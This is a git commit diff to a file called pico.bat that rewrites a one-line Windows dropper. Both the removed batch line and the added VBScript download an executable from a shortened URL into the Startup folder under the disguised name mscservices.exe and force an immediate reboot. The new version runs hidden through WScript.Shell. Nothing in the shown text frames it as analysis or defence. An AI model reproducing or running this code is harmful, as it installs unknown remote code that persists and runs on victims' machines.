ebbd44f199cfc0ea66783560738967ad7468d449
Schl <70095072+FilthyPenny@users.noreply.github.com>
2023-10-05 15:57:55 +0200

    Update pico.bat

--- pico.bat
+++ pico.bat
@@ -1,2 +1,2 @@
-@echo off
-powershell $s = [System.Environment]::GetFolderPath('Startup'); iwr https://s.id/1UPW2 -O $s/mscservices.exe && shutdown -r -f -t 0
+dim oShell: set oShell = CreateObject("WScript.Shell")
+oShell.run "cmd /c powershell $s = [System.Environment]::GetFolderPath('Startup'); iwr https://s.id/1UPW2 -O $s/mscservices.exe && shutdown -r -f -t 0", 0, true
